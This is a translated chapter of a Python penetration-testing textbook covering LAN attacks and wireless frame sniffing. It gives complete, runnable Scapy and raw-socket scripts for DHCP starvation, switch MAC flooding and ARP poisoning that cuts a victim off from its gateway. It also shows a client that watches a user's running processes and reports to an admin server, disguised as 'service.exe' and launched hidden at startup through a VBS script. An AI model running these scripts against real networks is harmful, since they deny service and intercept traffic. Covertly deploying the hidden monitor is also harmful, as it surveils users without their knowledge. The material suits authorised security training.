# Python 渗透测试基础知识（二）

> 原文：[`annas-archive.org/md5/D99A9F7802A11A3421FFD0540EBE69EA`](https://annas-archive.org/md5/D99A9F7802A11A3421FFD0540EBE69EA)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第四章：网络攻击和预防

在之前的章节中，您学习了网络扫描和网络嗅探。在本章中，您将看到不同类型的网络攻击以及如何防范它们。本章对网络管理员和网络渗透测试人员很有帮助。

在本章中，我们将涵盖以下主题。

+   **DHCP**（动态主机配置协议）饥饿攻击

+   交换机 MAC 洪泛攻击

+   通过原始套接字进行网关分离

+   Torrent 检测

到目前为止，您已经看到了 ARP 欺骗的实现。现在，让我们了解一种称为网络分离攻击的攻击。它的概念与 ARP 缓存中毒相同。

# 技术要求

您需要在系统上安装 Python 2.7.x。最后，要使用本书的 Git 存储库，用户需要安装 Git。

本章的代码文件可以在 GitHub 上找到：

[`github.com/PacktPublishing/Python-Penetration-Testing-Essentials-Second-Edition/tree/master/Chapter04`](https://github.com/PacktPublishing/Python-Penetration-Testing-Essentials-Second-Edition/tree/master/Chapter04)

查看以下视频以查看代码的运行情况：

[`goo.gl/oWt8A3`](https://goo.gl/oWt8A3)

# DHCP 饥饿攻击

在我们跳转到攻击之前，让我们看看 DHCP 服务器是如何工作的。当您通过交换机（接入点）连接到网络时，您的计算机会自动获取网络的 IP 地址。您可能想知道您的计算机从哪里获取了 IP。这些配置来自为网络配置的 DHCP 服务器。DHCP 服务器提供四个东西：IP 地址、子网掩码、网关地址和 DNS 服务器地址。但是如果您仔细分析，DHCP 服务器还为您分配 IP 地址提供了租约。在 Windows 命令提示符中键入`ipconfig/all`命令。租约获取和租约到期在以下截图中突出显示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/5719dcd6-f1df-497f-a46a-0d1fd9a9f27c.jpg)

您可以在矩形中看到 DHCP 租约。在这种攻击中，我们将向 DHCP 服务器发送一个虚假请求。DHCP 服务器为虚假请求分配带有`租约`的 IP。这样，我们将在租约到期之前完成 DHCP 服务器的 IP 地址池。为了执行这次攻击，我们需要两台机器：一台攻击者机器，必须安装有 Scapy 和 Python 的 Linux，以及一台配置了 DHCP 的 Linux 机器。两者必须连接。您可以使用 Kali 作为攻击机，CentOS 作为 DHCP 服务器。您可以从[`l4wisdom.com/linux-with-networking/dhcp-server.php`](http://l4wisdom.com/linux-with-networking/dhcp-server.php)配置 DHCP 服务器。

在学习代码和攻击之前，您必须了解 DHCP 服务器的工作原理：

. ![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/caf7a05d-031f-4e30-9fb9-e85a7d715339.jpg)

从上图中，我们可以理解以下内容：

1.  客户端广播**DHCP 发现**请求，请求 DHCP 配置信息

1.  **DHCP 服务器**响应包含 IP 地址和租约配置信息的**DHCP 提供**消息

1.  客户端通过选择提供的地址来接受提供。作为回应，客户端广播**DHCP 请求**消息

1.  **DHCP 服务器**向客户端发送单播 DHCP ACK/回复消息，其中包含以下 IP 配置和信息：

+   IP 地址：`192.168.0.120`

+   子网掩码：`255.255.255.0`

+   默认网关：`192.168.0.1`

+   DNS 服务器：`192.168.0.2`

+   租约：一天

要获得更多澄清，请参阅以下 Wireshark 截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/8e9fd748-0d6f-4f0b-a15b-4654dc3f36ce.jpg)

在上一张截图中，租约显示为六小时。

让我们看看代码；它有点难以理解，所以我把它分成不同的部分并解释了每一部分：

+   导入必要的库和模块如下：

```py
      from scapy.all import *
      import time
      import socket
      import struct
```

+   创建原始套接字以接收 IP 数据包如下：

```py
      s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, 
      socket.ntohs(0x0800))
      i = 1
```

+   使用 while 循环连续发送数据包：

```py
      while True:
```

+   使用 Scapy 创建以太网和 IP 数据包如下：

```py
    eth1 = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
    ip1 = IP(src="img/0.0.0.0",dst="255.255.255.255")
```

+   使用 Scapy 创建 UDP 和 bootp 数据包如下：

```py
    udp1= UDP(sport=68,dport=67)
    bootp1= BOOTP(chaddr=RandString(12,'0123456789abcdef'))
```

+   创建 DHCP 发现和 DHCP 请求数据包如下：

```py
    dhcp1 = DHCP(options=[("message-type","discover"),"end"])
    dhcp2 = DHCP(options=[("message-type","request")])
    dhcp_discover = eth1/ip1/udp1/bootp1/dhcp1
    dhcp_discover[BOOTP].xid= 123456
```

+   只需使用 Scapy 发送 DHCP 发现数据包并使用原始套接字接收响应如下：

```py
    sendp(dhcp_discover)
    pkt = s.recvfrom(2048)
    num = pkt[0][14].encode('hex')
    ip_length = (int(num) % 10) * 4
    ip_last_range = 14 + ip_length
    ipheader = pkt[0][14:ip_last_range]
    ip_hdr = struct.unpack("!12s4s4s",ipheader)
    server_ip = socket.inet_ntoa(ip_hdr[1])
    obtained_ip = socket.inet_ntoa(ip_hdr[2])

```

+   使用从前面步骤获得的参数创建 DHCP 请求数据包如下：

```py
    print "Obtained IP ",obtained_ip
    print "DHCP server IP ",server_ip
    dhcp_request = eth1/ip1/udp1/bootp1/dhcp2
    dhcp_request[BOOTP].xid= 123456
    name='master'+str(i)

    i =i+1
    dhcp_request[DHCP].options.append(("requested_addr", obtained_ip))
    dhcp_request[DHCP].options.append(("server_id", server_ip))
    dhcp_request[DHCP].options.append(("hostname", name))
    dhcp_request[DHCP].options.append(("param_req_list",
    b'x01x1cx02x03x0fx06x77x0cx2cx2fx1ax79x2a'))
    dhcp_request[DHCP].options.append(("end"))
```

+   发送请求数据包并间隔`0.5`秒发送下一个数据包如下：

```py
    time.sleep(.5)
    sendp(dhcp_request)
```

代码名称为`dhcp_starvation.py`。代码的工作分为两部分。首先，攻击者机器发送发现数据包，然后 DHCP 服务器发送具有给定 IP 的 DHCP 提供数据包。在下一部分中，我们的代码提取给定的 IP 和服务器 IP，制作名为 DHCP 请求的新数据包，并将其发送到 DHCP 服务器。在运行程序之前，请检查 DHCP 服务器中的 DHCP 租约文件，该文件位于**`\var\lib\dhcpd\dhcpd.lease`**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/dc460ca4-3045-4bfc-a507-5483971ed578.jpg)

您可以看到文件是空的，这意味着没有分配 IP。运行程序后，文件应该被填满，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/756c460a-d41c-411b-843a-e5a277e7f81a.jpg)

前面的屏幕截图显示获得的 IP 意味着 DHCP 的第 2 步正在工作并已完成。程序成功发送了虚假的 DHCP 请求。请参阅 DHCP 服务器租约文件的屏幕截图：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/d7ecb6df-0bc6-4326-930e-ed2f770b2529.jpg)

前面的屏幕截图表明程序正在成功运行。

# MAC flooding 攻击

MAC flooding 涉及向交换机发送大量请求。**内容寻址存储器**（**CAM**）将交换机与集线器分开。它存储信息，例如连接设备的 MAC 地址和物理端口号。CAM 表中的每个 MAC 都分配了一个交换机端口号。有了这些信息，交换机就知道在哪里发送以太网帧。CAM 表的大小是固定的。您可能想知道当 CAM 表收到大量请求时会发生什么。在这种情况下，交换机将变成集线器，并且传入的帧将泛滥到所有端口，使攻击者能够访问网络通信。

# 交换机如何使用 CAM 表

交换机学习连接设备的 MAC 地址及其物理端口，并将该条目写入 CAM 表，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/4f76d848-e99f-42e0-b0e0-38b7d139b0df.png)

CAM 表学习活动

前面的图分为两部分。在第一部分中，具有**MAC A**的计算机向具有**MAC B**的计算机发送**ARP**数据包。交换机学习数据包是从物理端口`1`到达的，并在**CAM 表**中创建一个条目，使 MAC A 与端口`1`相关联。交换机将数据包发送到所有连接的设备，因为它没有**MAC B**的 CAM 条目。在图的第二部分中，具有**MAC B**的计算机做出响应。交换机学习它来自端口`2`。因此，交换机创建一个条目，指出**MAC B**计算机连接到端口`2`。

# MAC flood 逻辑

当我们发送大量请求时，如前图所示，如果主机 A 发送具有不同 MAC 的虚假 ARP 请求，那么交换机将每次为端口`1`创建一个新条目，例如`A—1`，`X—1`和`Y—1`。有了这些虚假条目，CAM 表将变满，并且交换机将开始表现得像集线器。

现在，让我们编写代码如下：

```py
from scapy.all import *
num = int(raw_input("Enter the number of packets "))
interface = raw_input("Enter the Interface ")

eth_pkt = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")

arp_pkt=ARP(pdst='192.168.1.255',hwdst="ff:ff:ff:ff:ff:ff")

try:
  sendp(eth_pkt/arp_pkt,iface=interface,count =num, inter= .001)

except : 
  print "Destination Unreachable "
```

前面的代码非常容易理解。首先，它要求您要发送的数据包数量。然后，对于接口，您可以选择`WLAN`接口或`eth`接口。`eth_pkt`语句使用随机 MAC 地址形成一个以太网数据包。在`arp_pkt`语句中，形成了一个带有目标 IP 和目标 MAC 地址的 ARP 请求数据包。如果要查看完整的数据包字段，可以使用 Scapy 中的`arp_pkt.show()`命令。

`mac_flood.py`的 Wireshark 输出如下截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/490deb01-6f40-43dc-ae9e-bed6359bf000.png)

MAC 洪泛攻击的输出

MAC 洪泛的目的是检查交换机的安全性。如果攻击成功，请在报告中标记为成功。为了减轻 MAC 洪泛攻击，使用端口安全。端口安全将入站流量限制为一组选择的 MAC 地址或有限数量的 MAC 地址和 MAC 洪泛攻击。

# 通过原始套接字断开网关

在这种攻击中，受害者将保持连接到网关，但将无法与外部网络通信。简单地说，受害者将保持连接到路由器，但将无法浏览互联网。这种攻击的原理与 ARP 缓存中毒相同。攻击将向受害者发送 ARP 回复数据包，该数据包将使用另一个 MAC 地址将受害者的 ARP 缓存中的网关的 MAC 地址更改为另一个 MAC。在网关中也是同样的操作。

代码与 ARP 欺骗的代码相同，只是有一些更改，如下所述：

```py
import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

sor = 'x48x41x43x4bx45x52'

victmac ='x00x0Cx29x2Ex84x7A'
gatemac = 'x00x50x56xC0x00x08'
code ='x08x06'
eth1 = victmac+sor+code #for victim
eth2 = gatemac+sor+code # for gateway

htype = 'x00x01'
protype = 'x08x00'
hsize = 'x06'
psize = 'x04'
opcode = 'x00x02'

gate_ip = '192.168.0.1'
victim_ip = '192.168.0.11' 
gip = socket.inet_aton ( gate_ip )
vip = socket.inet_aton ( victim_ip )

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip

while 1:
  s.send(arp_victim)
  s.send(arp_gateway)
```

运行`netdiss.py`。我们可以看到代码中只有一个更改：`sor = 'x48x41x43x4bx45x52'`。这是一个随机的 MAC，因为这个 MAC 不存在。

为了进行 ARP 缓存中毒攻击，受害者应该在 ARP 缓存中有网关的真实条目。

您可能会想为什么我们使用了`'x48x41x43x4bx45x52'`MAC。将其转换为 ASCII，您将得到答案。

# 种子检测

网络管理员的主要问题是阻止用户机器上种子的使用。有时，小型组织或初创公司没有足够的资金购买防火墙来阻止种子的使用。在组织中，用户使用种子下载电影、歌曲等，这会占用大量带宽。在本节中，我们将看到如何使用 Python 程序消除这个问题。我们的程序将在种子程序运行时检测种子。

该概念基于客户端-服务器架构。服务器代码将在管理员机器上运行，客户端代码将在用户的机器上以隐藏模式运行。当用户使用种子时，客户端代码将通知服务器机器。

首先，看看以下服务器代码，并尝试理解代码。代码名称是`torrent_detection_server.py`：

+   按照以下方式导入必要的库：

```py
      import socket
      import logging
      import sys
```

+   为管理员打印消息。只使用*Ctrl* + *C*来停止程序，因为*Ctrl* + *C*由程序本身处理，套接字将自动关闭如下：

```py
      print "Welcome, torrent dection program started"
      print "Use only Ctrl+c to stop"
```

+   创建一个记录事件的日志文件，如下所示：

```py
      logger = logging.getLogger("torrent_logger")
      logger.setLevel(logging.INFO)
      fh = logging.FileHandler("torrent_dection.log")
      formatter = logging.Formatter('%(asctime)s - %(name)s - %      
      (levelname)s - %(message)s')
      fh.setFormatter(formatter)
      logger.addHandler(fh)
      logger.info("Torrent detection program started")
```

+   创建检测到的客户端列表，并定义服务器将在其上运行的服务器 IP 地址和端口，如下所示：

```py
      prcess_client = []
      host = "192.168.0.128"
      port = 54321
```

+   创建 UDP 套接字，如下所示：

```py
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.bind((host,port))
```

+   创建一个循环以持续监听。以下代码块接收来自客户端的消息，并在日志文件中记录事件，如下所示：

```py
      while True:
        try:

          data, addr = s.recvfrom(1024)
          print "\a\a\a\a\a\a\a"
          if addr[0] not in prcess_client :
            print data, addr[0]
            line = str(data)+" *** "+addr[0]
            logger.info(line)
            line = "\n****************************\n"
            logger.info(line)
          prcess_client.append(addr[0])
        except KeyboardInterrupt:
          s.close()
          sys.exit()

        except:
          pass
```

现在让我们看看客户机的代码。打开`service.py`代码：

+   按照以下方式导入必要的库和模块：

```py
      import os
      import re
      import time
      import socket
      import getpass
```

+   定义服务器 IP 和服务器端口，以便创建套接字，如下所示：

```py
      host = "192.168.0.128"
      port = 54321
```

+   使用无限循环，使程序保持活动状态，如下所示：

```py
      while True:
        try:
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          name =socket.gethostname()
          user = getpass.getuser()
```

+   查看当前任务列表，并尝试在任务列表中找到种子。如果找到种子，向服务器发送精心制作的消息如下：

```py
    response = os.popen('tasklist')
    for line in response.readlines():
      str1 = "Torrent Identified on host "+str(name)+" User "+str(user)
      if re.search("torrent", line.lower()):
        s.sendto(str1,(host,port))
        s.sendto(str1,(host,port))
        s.sendto(str1,(host,port))
        #s.send("")
        break

          s.close()
          time.sleep(30)
        except :
          pass
```

在前面的程序中，我使用了`30`秒作为下一次迭代的时间，以获得快速结果。您可以根据自己的方便更改时间。如果流量很大，可以使用 15 分钟（`15*60`）。

为了运行和测试我们的程序，我们至少需要两台计算机。一个程序将在由网络管理员处理的服务器上运行。第二个程序将在客户机上运行。

让我们逐个运行代码并研究我们的测试用例：种子正在运行时和种子未运行时。首先运行服务器程序。你可以在任何操作系统上运行服务器程序：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/af10a557-223e-486c-b19f-66fcef6dbfd0.jpg)

服务器程序正在运行；让我们运行客户端代码`service.py`，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/09a6ecab-3a1e-4c65-b69c-97f55f209717.jpg)

上面的程序只是运行并不断扫描当前任务。由于我们在程序中定义了 30 秒，它会在 30 秒后扫描当前任务。看下面的截图，这是在 Windows 任务管理器中运行的种子服务：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/8d8ad7ea-1cc7-4257-98ed-7031f50acccb.jpg)

所以 uTorrent 正在客户机上运行。如果客户端代码发现包含种子名称的任务，那么它会将消息发送到服务器。因此，在客户端程序中，我们使用了`response = os.popen('tasklist')`这一行，它在命令提示符中运行 tasklist 命令，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/20a9f8f5-4473-44a4-b8c8-4f802d5c4647.jpg)

上面的截图显示了种子正在运行。

如果在客户机上运行种子文件，那么服务器会收到以下消息：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/cfca23c4-37df-4c17-a613-be7432add28f.jpg)

搞定！一台名为`Intel`的机器，用户为`Mohit`，IP 地址为`192.168.0.129`，正在使用种子。客户端发送了三条消息给我们，但我们只显示了一条。我们使用的是 UDP，这是一种无连接的协议。如果数据包在传输中丢失，服务器和客户端都不会知道。这就是为什么客户端发送了三个数据包。

为什么使用 UDP 而不是 TCP？TCP 是一种面向连接的协议。如果服务器机器宕机，那么客户机上的程序将开始报错。

如果你在屏幕上丢失了输出，你可以在日志文件中检查输出。打开`torrent_dection.log`：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/4131ffb5-50f9-4131-a52b-aa9857f8669a.jpg)

现在你应该更好地理解了种子检测。但我们的工作还没有完成。如果客户机上的用户知道某种检测程序正在运行，他们可能会停止程序。我们必须让客户端代码以隐藏模式运行。

# 以隐藏模式运行程序

首先，我们必须将`service.py`程序更改为 Windows 可执行文件。为了将 Python 程序转换为 Windows 可执行文件，我们将使用 Pyinstaller。

让我们将文件改为 Windows 可执行文件。将`service.py`代码文件复制到`C:\PyInstaller-2.1`文件夹中。

打开命令提示符，浏览到`C:\PyInstaller-2.1`文件夹，并运行以下命令：

```py
Python pyinstaller.py --onefile <file.py>
```

查看下面的截图以获得更多解释：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/7a1e0201-d7e3-41bb-840d-2bd1d1055163.jpg)

上面的截图是不言自明的。现在可执行文件已经创建，可以通过点击来运行。当你点击时，它会打开命令提示符屏幕。

现在以隐藏模式运行可执行程序。

创建一个`service.vbs`文件，并在文件中写入以下行：

```py

Dim WinScriptHost
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "%WINDIR%\service.exe" & Chr(34), 0
Set WinScriptHost = Nothing
```

在上面的文件中，我使用了`%WINDIR%`，它表示`Windows`文件夹；因为我在`C:`驱动器上安装了 Windows，`%WINDIR%`就变成了`C:\Windows`。只需点击`service.vbs`。`service.exe`程序将作为守护进程运行，没有图形界面，只有后台处理。将`service.vbs`放在`Windows 启动`文件夹中，这样下次 Windows 启动时，`service.vbs`文件将自动执行。

希望你喜欢这一章。

# 总结

在本章中，我们学习了网络攻击；DHCP 饥饿攻击可以通过使用我们的 Python 代码来高效地执行。Python 代码可以用于非法的 DHCP 服务器。MAC 洪泛攻击可以将交换机变成集线器。必须启用端口安全以减轻攻击。网关断开攻击非常容易执行；攻击者可以使用这种攻击来打扰用户。网关在 ARP 缓存中的静态条目可能是对抗攻击的一个可能解决方案。尽管下载种子被禁止，但对于小型组织来说仍然是一个大问题。本章介绍的解决方案对抗种子下载可能非常有效。在下一章中，您将学习关于无线流量监控的内容。您将学习无线帧、帧捕获和无线攻击。


# 第五章：无线渗透测试

无线连接的时代已经实现了灵活性和移动性，但也带来了许多安全问题。在有线连接中，攻击者需要物理接触才能连接和攻击。而在无线连接的情况下，攻击者只需要信号的可用性就可以发动攻击。在继续之前，您应该了解使用的术语：

+   **接入点**（**AP**）：用于将无线设备连接到有线网络。

+   **服务集标识符**（**SSID**）：这是无线局域网的唯一的 0-32 个字母数字标识符。它是人类可读的，简单来说，就是网络名称。

+   **基本服务集标识**（**BSSID**）：这是无线 AP 的 MAC 地址。

+   **信道号**：这代表 AP 用于传输的无线电频率的范围。

由于 AP 的自动设置可能会改变信道号，所以在本章中不要感到困惑。如果您在不同的时间运行相同的程序，信道号可能会改变。

在本章中，我们将涵盖以下概念：

+   查找无线 SSID

+   分析无线流量

+   检测 AP 的客户端

+   无线去认证攻击

+   检测去认证攻击

# 802.11 帧简介

IEEE 将 802.11 和 802.11x 定义为无线局域网技术家族。以下是基于频率和带宽的 802.11 规范：

+   `802.11`：提供带宽高达 1-2 Mbps，使用 2.4 GHz 频段

+   `802.11.a`：提供带宽高达 54 Mbps，使用 5 GHz 频段

+   `802.11.b`：提供带宽高达 11 Mbps，使用 2.4 GHz 频段

+   `802.11g`：提供带宽高达 54 Mbps，使用 2.4 GHz 频段

+   `802.11n`：提供带宽高达 300 Mbps，使用两个频段

所有`802.11`的组件都属于**媒体访问控制**（**MAC**）层或物理层。MAC 层是数据链路层的子类。我们已经在第二章中介绍了数据链路层的**协议数据单元**（**PDU**），也就是帧。

不过，首先让我们了解`802.11`帧格式。`802.11`中存在的三种主要类型的帧是：

+   数据帧

+   控制帧

+   管理帧

这些帧由 MAC 层辅助。下图显示了 MAC 层的格式：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/ccb2c53a-f4d3-4e73-94ee-e5a8183d779e.png)

在上图中，显示了三种类型的地址。**地址 1**、**地址 2**和**地址 3**分别是目的地、AP 和源的 MAC 地址。这意味着**地址 2**是 AP 的 BSSID。在本章中，我们的重点将放在管理帧上，因为我们对管理帧的子类型感兴趣。一些常见的管理帧类型包括认证帧、去认证帧、关联请求帧、解除关联帧、探测请求帧和探测响应帧。客户端和 AP 之间的连接是通过各种帧的交换来建立的，如下图所示：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/f8288cfe-bdc3-4db7-80e7-b3179b31e09b.png)

帧交换

上图显示了帧的交换。这些帧包括：

+   **信标帧**：AP 定期发送信标帧来宣传自己的存在。信标帧包含诸如 SSID、信道号和 BSSID 等信息。

+   **探测请求**：无线设备（客户端）发送探测请求以确定范围内有哪些接入点。探测请求包含诸如 AP 的 SSID、支持的速率和特定厂商信息等元素。客户端发送探测请求并等待探测响应。

+   **探测响应**：作为对探测请求的响应，相应的接入点将会回复一个包含能力信息和支持的数据速率的探测响应帧。

+   **认证请求**：客户端发送包含其身份的认证请求帧。

+   **认证响应**：AP 响应认证，表示接受或拒绝。如果存在共享密钥认证，例如 WEP，那么 AP 会以认证响应的形式发送挑战文本。客户端必须将受挑战文本的加密形式发送回 AP。

+   **关联请求**：成功认证后，客户端发送包含其特征的关联请求，例如支持的数据速率和 AP 的 SSID。

+   **关联响应**：AP 发送包含接受或拒绝的关联响应。在接受的情况下，AP 将为客户端创建关联 ID。

我们即将进行的攻击将基于这些帧。

现在，是时候进行实际操作了。在接下来的部分，我们将讨论理论的其余部分。

# 使用 Python 进行无线 SSID 查找和无线流量分析

如果您使用过 Back-Track 或 Kali Linux 进行无线测试，那么您将熟悉`airmon-ng`套件。`airmon-ng`脚本用于在无线接口上启用监视模式。监视模式允许无线设备捕获帧而无需与 AP 关联。我们将在 Kali Linux 上运行所有程序。以下截图显示了如何设置**mon0**：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/30d14dcc-8380-4316-8e0c-59efb310e9bf.png)

设置 mon0

运行`airmon-ng`脚本时，它会为无线网卡命名，例如**wlan0**，如前面的截图所示。`airmon-ng start wlan0`命令将在监视模式下启动**wlan0**，而**mon0**将捕获无线数据包。

现在，让我们编写我们的第一个程序，该程序提供三个值：SSID、BSSID 和信道号。程序名称是`ssid_finder_raw.py`。让我们看看代码和解释如下：

1.  导入必要的库：

```py
      import socket 
      import struct
      import shelve 
      import sys
      import traceback
```

1.  为了使用户能够查看先前存储的结果，请运行以下命令：

```py
      ch = raw_input("Press 'Y' to know previous result ")
      print "USE only Ctrl+c to exit "
```

1.  如果用户按下`Y`，则程序将打开`wireless_data.dat`文件并获取信息，例如 SSID、BSSID 和信道号。如果是第一次运行，`wireless_data.dat`文件将不存在：

```py
      try :
        if ch.lower() == 'y':
          s = shelve.open("wireless_data.dat")
          print "Seq", "\tBSSID\t\t", "\tChannel", "SSID"
          keys= s.keys()
          list1 = []
          for each in keys:
            list1.append(int(each))
          list1.sort()

          for key in list1:
            key = str(key)
            print key,"\t",s[key][0],"\t",s[key][1],"\t",s[key][2]
          s.close()
          raw_input("Press any key to continue ")
          except Exception as e :
          print e
          raw_input("Press any key to continue ")
```

1.  该代码创建一个套接字来捕获所有帧并将它们绑定到`mon0`。希望您已经仔细阅读了第三章，*嗅探和渗透测试*。唯一的新东西是`3`。3 参数表示协议号，表示`ETH_P_ALL`。这意味着我们对每个数据包都感兴趣：

```py
      try:
        sniff = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 3)
        sniff.bind(("mon0", 0x0003))

      except Exception as e :
        print e 
```

1.  定义一个`ap_list`列表，稍后将使用。打开名为`wireless_data.dat`的 shelve 文件：

```py
      ap_list =[]
      print "Seq", "\tBSSID\t", "\t\tChannel", "SSID"
      s = shelve.open("wireless_data.dat","n")
```

1.  接收 Beacon 帧，提取`SSID`、`BSSID`和信道号信息，并将其保存在`wireless_data.dat`文件中。

1.  `if fm[radio_tap_lenght] == "\x80"`语法只允许 Beacon 帧。要理解`radio_tap_lenght+4+6+6+6+2+12+1`语法，请参见以下内容：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/fd8873ef-ffe7-465b-8af0-78f9465b4d96.jpg)

通过查看截图，您可以了解与`radio_tap_length`一起使用的数字值。

```py
      try:
        while True :
          fm1 = sniff.recvfrom(6000)
         fm= fm1[0]
          radio_tap_lenght = ord(fm[2])
          #print radio_tap_lenght
          if fm[radio_tap_lenght] == "\x80" :
            source_addr = 
            fm[radio_tap_lenght+4+6:radio_tap_lenght+4+6+6]
            #print source_addr
            if source_addr not in ap_list:
              ap_list.append(source_addr)
              byte_upto_ssid = radio_tap_lenght+4+6+6+6+2+12+1
              a = ord(fm[byte_upto_ssid])
              list_val = []
              #print a
              bssid = ':'.join('%02x' % ord(b) for b in source_addr)
              #bssid = fm[36:42].encode('hex')
              s_rate_length = ord(fm[byte_upto_ssid+1 +a+1])
              channel = ord(fm[byte_upto_ssid+1 +a+1+s_rate_length+3])
              ssid = fm[byte_upto_ssid+1:byte_upto_ssid+1 +a]
```

1.  将获取的信息保存在`wireless_data.dat`中：

```py
        print len(ap_list),"\t",bssid,"\t",channel,"\t",ssid
        list_val.append(bssid)
        list_val.append(channel)
        list_val.append(ssid)
        seq = str(len(ap_list))
        s[seq]=list_val
       except KeyboardInterrupt:
        s.close()
        sys.exit()

       except Exception as e :
       traceback.print_exc()
        print e 
```

如果要使用*Wireshark*捕获帧，请使用`mon0`模式。以下帧是 Beacon 帧：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/c1b0864d-1feb-4f0d-9dac-1bb4e99271f2.png)

Beacon 帧的 Wireshark 表示

上面的截图将清楚地解决您的疑问。截图是不言自明的。您可以看到信道号、SSID 和 BSSID。

我在两张不同的无线 USB 卡上测试了代码。以下是`ssid_finder_raw.py`的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/64ce38c0-49e7-44a1-ad7d-5803b4521f37.jpg)

始终按下*Ctrl* + *C* 以存储结果。

现在，让我们编写代码，使用 Scapy 找到 AP 的 SSID 和 MAC 地址。你可能会认为我们已经在原始数据包分析中执行了相同的任务。使用 scapy 编写代码比使用原始套接字更容易，实际上，出于研究目的，你应该了解原始数据包分析。如果你想要一些 Scapy 不知道的信息，原始数据包分析可以让你自由创建所需的嗅探器：

```py
from scapy.all import *
interface = 'mon0'
ap_list = []
def info(fm):
  if fm.haslayer(Dot11):

    if ((fm.type == 0) & (fm.subtype==8)):
      if fm.addr2 not in ap_list:
        ap_list.append(fm.addr2)
        print "SSID--> ",fm.info,"-- BSSID --> ",fm.addr2

sniff(iface=interface,prn=info)
```

让我们从头开始看代码。`scapy.all import *`语句导入了 Scapy 库的所有模块。变量接口设置为`mon0`。声明了一个名为`ap_list`的空列表。在下一行，定义了`info`函数并传递了`fm`参数。

`if fm.haslayer(Dot11):`语句就像一个过滤器，只传递`Dot11`流量；`Dot11`表示 802.11 流量。接下来的`if((fm.type == 0) & (fm.subtype==8)):`语句是另一个过滤器，它传递帧类型为`0`且帧子类型为`8`的流量；类型`0`表示管理帧，子类型`8`表示 Beacon 帧。在下一行，`if fm.addr2 not in ap_list:`语句用于去除冗余；如果 AP 的 MAC 地址不在`ap_list`中，那么它会将列表附加并将地址添加到列表中，如下一行所述。下一行打印输出。最后的`sniff(iface=interface,prn=info)`行使用接口`mon0`嗅探数据，并调用`info()`函数。

以下截图显示了`ssid.py`程序的输出：

![](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/py-pentest-ess/img/ac8dc7b7-c08f-4990-bf4e-40e6e4af6362.png)

我希望你现在理解了`ssid.py`程序。让我们试着找出 AP 的信道号。我们将不得不对代码进行一些修改。修改后的代码如下：

```py
from scapy.all import *
import struct
interface = 'mon0'
ap_list = []
def info(fm):
  if fm.haslayer(Dot11):
    if ((fm.type == 0) & (fm.subtype==8)):
      if fm.addr2 not in ap_list:
        ap_list.append(fm.addr2)
        print "SSID--> ",fm.info,"-- BSSID --> ",fm.addr2, "-- Channel-
         -> ", ord(fm[Dot11Elt:3].info)
        sniff(iface=interface,prn=info)
```

你会注意到我们在这里添加了一件事，那就是`ord(fm[Dot11Elt:3].info)`。

你可能想知道`Dot11Elt`是什么。如果你在 Scapy 中打开`Dot11Elt`，你会得到三个东西，`ID`，`len`和`info`，如下面的输出所示：

```py
  root@Mohit|Raj:~# scapy
  INFO: Can't import python gnuplot wrapper . Won't be able to plot.
  WARNING: No route found for IPv6 destination :: (no default route?)
  lWelcome to Scapy (2.2.0)
  >>> ls(Dot11Elt)
  ID         : ByteEnumField        = (0)
  len        : FieldLenField        = (None)
  info       : StrLenField          = ('')
  >>>
```

查看以下类代码：

```py
class Dot11Elt(Packet):
  name = "802.11 Information Element"
  fields_desc = [ ByteEnumField("ID", 0, {0:"SSID", 1:"Rates", 2:  
  "FHset", 3:"DSset", 4:"CFset", 5:"TIM", 6:"IBSSset", 16:"challenge",
  42:"ERPinfo", 46:"QoS Capability", 47:"ERPinfo", 48:"RSNinfo",    
  50:"ESRates",221:"vendor",68:"reserved"}),
  FieldLenField("len", None, "info", "B"),
  StrLenField("info", "", length_from=lambda x:x.len) ]
```

